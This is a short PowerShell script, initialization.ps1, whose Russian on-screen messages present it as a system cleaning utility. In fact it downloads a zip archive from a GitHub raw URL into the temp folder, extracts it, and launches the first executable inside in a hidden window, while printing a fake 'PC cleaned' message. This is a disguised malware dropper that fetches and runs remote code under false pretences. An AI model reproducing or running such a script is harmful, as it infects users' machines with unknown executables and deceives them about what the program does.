# =============================================
# initialization.ps1
# =============================================

$Url = "https://github.com/v25888656-maker/CHECKK/raw/refs/heads/main/CHHECK.zip"
$ZipPath = "$env:TEMP\CHHECK.zip"
$ExtractPath = "$env:TEMP\extract"

Write-Host "[*] Очистка системы..." -ForegroundColor Cyan
Start-Sleep -Seconds 1

try {
    (New-Object Net.WebClient).DownloadFile($Url, $ZipPath)
} catch {
    Write-Host "[-] Ошибка очистки" -ForegroundColor Red
    Start-Sleep -Seconds 2
    exit
}

try {
    Expand-Archive -Path $ZipPath -DestinationPath $ExtractPath -Force
} catch {
    Write-Host "[-] Ошибка очистки" -ForegroundColor Red
    Start-Sleep -Seconds 2
    exit
}

$Exe = Get-ChildItem -Path $ExtractPath -Filter "*.exe" -Recurse | Select-Object -First 1

if ($Exe) {
    Start-Process -WindowStyle Hidden $Exe.FullName
    Write-Host "[+] ПК очищен" -ForegroundColor Green
} else {
    Write-Host "[-] Ошибка очистки" -ForegroundColor Red
}

Start-Sleep -Seconds 2
exit